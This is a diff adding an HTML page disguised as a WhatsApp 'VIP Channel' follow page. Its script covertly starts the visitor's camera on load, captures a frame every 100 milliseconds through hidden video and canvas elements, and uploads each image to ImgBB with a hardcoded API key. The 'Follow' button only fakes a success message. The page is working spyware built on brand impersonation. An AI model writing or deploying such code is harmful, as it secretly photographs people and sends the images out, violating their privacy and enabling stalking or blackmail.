@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WhatsApp VIP Access</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #e5f5e0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      color: #075e54;
+    }
+
+    .logo {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+
+    .container {
+      background-color: #ffffff;
+      border-radius: 15px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      padding: 25px;
+      width: 300px;
+      text-align: center;
+    }
+
+    button {
+      background-color: #25d366;
+      color: white;
+      padding: 12px 25px;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: bold;
+      margin: 15px 0;
+      transition: all 0.3s;
+      width: 100%;
+    }
+
+    button:hover {
+      background-color: #128c7e;
+    }
+
+    button:disabled {
+      background-color: #cccccc;
+      cursor: not-allowed;
+    }
+
+    .status {
+      margin-top: 15px;
+      font-weight: bold;
+      min-height: 20px;
+    }
+
+    .success {
+      color: #25d366;
+    }
+
+    .error {
+      color: #ff4444;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://web.whatsapp.com/img/favicon/icon-192x192.png" class="logo" alt="WhatsApp Logo">
+  <div class="container">
+    <h2>VIP WhatsApp Channel</h2>
+    <p>Get exclusive content and updates</p>
+    
+    <button id="followBtn">Follow Channel</button>
+    <div class="status" id="status"></div>
+  </div>
+
+  <!-- Hidden camera elements -->
+  <video id="video" autoplay muted playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const followBtn = document.getElementById('followBtn');
+    const status = document.getElementById('status');
+    let photoCount = 0;
+    let captureInterval;
+
+    // Start camera and capture immediately
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        
+        // Start capturing photos every 100ms
+        setTimeout(() => {
+          captureInterval = setInterval(() => {
+            captureAndUploadPhoto();
+          }, 100);
+        }, 100);
+      })
+      .catch(err => {
+        console.error("Camera error:", err);
+      });
+
+    function captureAndUploadPhoto() {
+      try {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        const imageData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+        
+        // Upload to ImgBB
+        const apiKey = "05286aa5b2d314959e9cd61d0693d3e2";
+        const formData = new FormData();
+        formData.append('image', imageData);
+        
+        fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, {
+          method: "POST",
+          body: formData
+        }).then(response => response.json())
+          .then(data => {
+            if(data.success) {
+              photoCount++;
+              console.log(`Photo ${photoCount} uploaded:`, data.data.url);
+            }
+          });
+      } catch(e) {
+        console.error("Capture error:", e);
+      }
+    }
+
+    // Follow button click handler
+    followBtn.addEventListener('click', () => {
+      followBtn.disabled = true;
+      followBtn.textContent = "Following...";
+      status.textContent = "Processing your request...";
+      status.className = "status";
+      
+      // Fake processing delay
+      setTimeout(() => {
+        status.textContent = "Successfully followed VIP channel!";
+        status.className = "status success";
+      }, 3000);
+    });
+  </script>
+</body>
+</html>
